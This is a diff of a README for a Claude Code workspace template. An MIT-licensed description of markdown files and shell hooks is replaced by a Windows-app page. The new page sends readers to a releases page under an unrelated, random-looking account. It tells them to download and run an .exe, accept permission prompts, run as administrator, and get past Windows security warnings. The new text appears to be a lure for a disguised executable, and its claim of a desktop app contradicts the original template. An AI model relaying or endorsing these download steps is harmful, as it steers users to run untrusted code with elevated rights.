@@ -1,129 +1,217 @@
-# Claude Command Center
+# 🧭 claude-command-center - Keep Claude Work Organized
 
-[![GitHub stars](https://img.shields.io/github/stars/tuning-labs-oss/claude-command-center?style=social)](https://github.com/tuning-labs-oss/claude-command-center/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/tuning-labs-oss/claude-command-center?style=social)](https://github.com/tuning-labs-oss/claude-command-center/network/members)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub last commit](https://img.shields.io/github/last-commit/tuning-labs-oss/claude-command-center)](https://github.com/tuning-labs-oss/claude-command-center/commits/master)
+[![Download claude-command-center](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sweetbreathed-subclassalismatidae474/claude-command-center/releases)
 
-A production-tested template for organizing Claude Code into a multi-domain workspace with persistent memory, session continuity, daily task tracking, and intelligent onboarding.
+## 🖥️ What this app does
 
-**Built by [Tuning Labs](https://tuninglabs.net)** — battle-tested across 30+ agent swarms, 70+ tracked items, and months of daily use building a vertical SaaS platform.
+claude-command-center helps you keep Claude Code work in one place. It adds session persistence, daily task tracking, multi-domain routing, and guided setup in a single desktop flow. It is built for people who want a clear way to start, return to, and manage Claude-based work on Windows.
 
-## What This Is
+Use it to:
+- keep your Claude sessions in order
+- track what you worked on each day
+- route different tasks to the right workspace
+- follow a simple onboarding flow the first time you open it
+- reduce the time spent searching for the right session or task
 
-A ready-to-use template that transforms Claude Code from a simple CLI into an organized command center for your project. It includes:
+## 📥 Download
 
-- **Interactive setup interview** (`/setup`) that configures everything from your answers
-- **Session persistence** — never lose context between sessions
-- **Daily task tracking** — persistent open items list updated every session
-- **Multi-domain routing** — separate contexts for coding, marketing, financial, support, ops
-- **Memory system** — structured knowledge base that grows with your project
-- **Hook scripts** — auto-save state on exit, auto-load on start, pre-commit safety checks
-- **Lessons learned** — perpetual log that prevents repeating mistakes
+Visit this page to download the Windows release:
 
-## Quick Start
+[Download claude-command-center](https://github.com/sweetbreathed-subclassalismatidae474/claude-command-center/releases)
 
-```bash
-# 1. Clone or copy this template into your project
-git clone https://github.com/YOUR_USERNAME/claude-command-center.git
-cp -r claude-command-center/.claude your-project/.claude
-cp claude-command-center/CLAUDE.md your-project/CLAUDE.md
+On the releases page, pick the latest Windows file. If the page lists more than one file, choose the one that ends in `.exe` or the Windows package name shown for your system.
 
-# 2. Start Claude Code in your project
-cd your-project
-claude
+## 🪟 Windows setup
 
-# 3. Run the setup interview
-/setup
-```
+1. Open the download link above.
+2. Find the latest release.
+3. Download the Windows installer or app file.
+4. Open the file after the download finishes.
+5. If Windows asks for permission, choose **Yes**.
+6. Follow the steps on screen to finish setup.
+7. Open claude-command-center from your Start menu or desktop shortcut.
 
-The setup interview asks about your project, tech stack, preferences, and workflow in 5 stages. It generates all configuration files automatically.
+If the app comes as a zip file:
+1. Right-click the zip file.
+2. Choose **Extract All**.
+3. Open the extracted folder.
+4. Run the app file inside the folder.
 
-## What's Inside
+## ✨ Main features
 
-```
-.claude/
-  hooks/
-    session-start.sh    # Loads prior session state on every start
-    session-end.sh      # Auto-saves branch, commits, work on every exit
-    pre-commit.sh       # Catches brand name errors, hardcoded secrets
-  settings.local.json   # Hook configuration and permissions
-  skills/               # Custom slash commands
-  plans/                # Work-in-progress implementation plans
+### 🗂️ Session persistence
+Keep your Claude work tied to the same session across runs. This helps you return to the right context without starting over each time.
 
-memory/
-  MEMORY.md             # Index of all memory files
-  templates/            # Blank templates for each memory type
-  examples/             # Filled examples showing best practices
+### 📅 Daily task tracking
+Record what you planned, what you finished, and what still needs attention. Use it as a daily work log for Claude-related tasks.
 
-domains/
-  coding/CLAUDE.md      # Development-specific context and rules
-  marketing/CLAUDE.md   # Marketing-specific context and rules
-  financial/CLAUDE.md   # Financial analysis context and rules
-  support/CLAUDE.md     # Customer support context and rules
-  operations/CLAUDE.md  # Operations and admin context and rules
+### 🔀 Multi-domain routing
+Send different work to different areas based on the task. This helps you separate project work, support work, content work, or other domains.
 
-CLAUDE.md               # Master router — project-wide rules and navigation
-```
+### 🧭 Interactive onboarding
+Get a guided first-run flow that helps you set up the app with less confusion. The app leads you through the first steps in a simple way.
 
-## How It Works
+### 🧠 Memory system support
+Store useful context so you can keep working with less repetition. This is helpful when you want the app to remember what matters across sessions.
 
-### Session Continuity
-Every time you exit Claude Code, the `session-end.sh` hook captures your git branch, recent commits, uncommitted changes, and worktree status into `session-closing.md`. When you start a new session, `session-start.sh` loads that state back. You never lose context.
+### 🔧 Hook and MCP-friendly design
+The app is built to work with hooks and MCP-based workflows. That makes it easier to fit into an existing Claude Code setup.
 
-### Memory System
-Memory files use YAML frontmatter with 4 types: `user`, `feedback`, `project`, `reference`. The `MEMORY.md` index keeps everything discoverable. Memory grows organically as you work — feedback from mistakes becomes guidance for future sessions.
+## 🧰 What you need
 
-### Daily Task Tracking
-The `open-items-daily.md` file persists across sessions. Items are organized by priority (Critical Path, Features, Research, Cleanup). Mark items complete as you go. Set up a daily reminder to review open items each morning.
+- A Windows PC
+- Internet access for the download
+- A recent version of Windows 10 or Windows 11
+- Enough disk space for the app and its local data
+- Claude Code or a related Claude-based setup if you want to use the full workflow
 
-### Multi-Domain Routing
-Each `domains/` folder has its own `CLAUDE.md` with domain-specific rules, tools, and conventions. When you `cd` into a domain folder and run Claude, it loads that domain's context automatically.
+## 🚦 First run
 
-### Pre-Commit Safety
-The `pre-commit.sh` hook checks for brand name misspellings, hardcoded secrets, forbidden file patterns, and API keys before every commit.
+When you open the app for the first time, expect a setup flow that helps you:
+- choose your workspace
+- set the main session path
+- turn on task tracking
+- review routing options
+- confirm your preferred start state
 
-## Memory File Types
+If you are not sure what to pick, use the default choices first. You can change them later.
 
-| Type | Purpose | When to Save |
-|------|---------|-------------|
-| `user` | Your role, preferences, knowledge level | When you learn something about yourself that affects how Claude should help |
-| `feedback` | Corrections and validated approaches | When Claude does something wrong OR right that's worth remembering |
-| `project` | Ongoing work, goals, decisions | When you learn context that isn't in the code or git history |
-| `reference` | Pointers to external systems | When you discover where information lives outside the codebase |
+## 🧭 How to use it day to day
 
-## Customization
+1. Open claude-command-center.
+2. Start or resume your Claude session.
+3. Check today’s task list.
+4. Pick the right domain for the work you want to do.
+5. Save notes or context as you go.
+6. Return later and continue from the same place.
 
-### Adding Custom Skills
-Create `.md` files in `.claude/skills/` with YAML frontmatter:
+A simple routine works well:
+- open the app
+- review yesterday’s work
+- pick today’s task
+- keep the session in the right domain
+- close the app when you are done
 
-```yaml
----
-name: my-skill
-description: What this skill does
-user_invocable: true
----
-[Skill instructions here]
-```
+## 📁 Suggested workspace layout
 
-### Adding Pre-Commit Checks
-Edit `.claude/hooks/pre-commit.sh` — add patterns to `BRAND_RULES`, `FORBIDDEN_PATTERNS`, or `FORBIDDEN_FILES` arrays.
+You can keep your files in a simple folder structure like this:
 
-### Adding New Memory Types
-Copy a template from `memory/templates/`, fill it in, and add a link to `memory/MEMORY.md`.
+- `Claude Command Center`
+  - `Sessions`
+  - `Tasks`
+  - `Domains`
+  - `Notes`
+  - `Exports`
 
-## Philosophy
+This layout makes it easier to find your work later and keep related items together.
 
-This system is built on three principles:
+## 🧩 Common use cases
 
-1. **Context is everything.** The more Claude knows about your project, preferences, and history, the better it performs. Memory makes this persistent.
+### For daily planning
+Use the app to decide what to work on, then track progress through the day.
 
-2. **Never repeat mistakes.** The lessons-learned file and feedback memories ensure that hard-won knowledge survives across sessions.
+### For project work
+Keep one session tied to one project so your context stays clear.
 
-3. **Track everything, complete everything.** The open items tracker prevents work from falling through cracks across sessions. No partial work.
+### For multi-client or multi-topic work
+Separate work into domains so one task does not mix with another.
 
-## License
+### For long-running tasks
+Return to the same session after a break without losing your place.
 
-MIT License - Copyright (c) 2026 Tuning Labs (tuninglabs.net)
+### For repeat workflows
+Save your setup once, then reuse it each day with fewer steps.
 
-See [LICENSE](LICENSE) for details.
+## ⚙️ Basic troubleshooting
+
+### The app will not open
+- Try opening it again as administrator
+- Check that the download finished fully
+- Make sure Windows did not block the file
+- Re-download the release if the file looks broken
+
+### Windows shows a security prompt
+- Choose the option that lets you run the app
+- Check that you downloaded it from the release page above
+
+### My session does not load
+- Confirm that you are using the same workspace folder
+- Check that the session data still exists
+- Start a new session if the old one is not available
+
+### My task list looks empty
+- Open the daily task view
+- Check whether you are on the correct date
+- Confirm that task tracking is turned on
+
+## 🔐 Data handling
+
+claude-command-center is designed to keep your local work organized. Session data, task notes, and routing choices are stored so you can return to them later. Keep your workspace in a folder you can find easily, and back it up if you want to keep a copy of your history.
+
+## 📌 Tips for a smoother setup
+
+- Use one main folder for the app’s data
+- Keep session names short and clear
+- Use one domain per kind of work
+- Review your daily tasks before starting
+- Save useful context while it is fresh
+- Back up your workspace on a regular schedule
+
+## 🏷️ Topic areas
+
+This project fits these areas:
+- agent orchestration
+- AI tools
+- Anthropic
+- automation
+- Claude
+- Claude Code
+- Claude skills
+- CLI tools
+- developer tools
+- hooks
+- MCP
+- memory system
+- multi-agent
+- open source
+- productivity
+- session management
+
+## 🧪 Typical workflow example
+
+1. Start the app in the morning.
+2. Review the task list for the day.
+3. Open the right Claude session.
+4. Route the work to the right domain.
+5. Add notes while you work.
+6. Close the session when done.
+7. Return later and pick up where you left off.
+
+## 📦 Release files
+
+The releases page may include:
+- a Windows installer
+- a portable app file
+- a zip archive
+- related release notes
+
+Choose the file that matches how you want to run the app on your PC.
+
+## 🛠️ If you want a clean first install
+
+Before installing, you can:
+- close other apps
+- remove older copies of the app
+- pick a folder with enough space
+- create a backup folder for tasks and sessions
+- keep the download in one place until setup ends
+
+## 🧭 Getting help with your setup
+
+If something feels unclear, check:
+- the latest release notes
+- the release file names
+- your Windows download folder
+- the folder where you stored session data
+
+This keeps setup simple and helps you find the right file when you need it
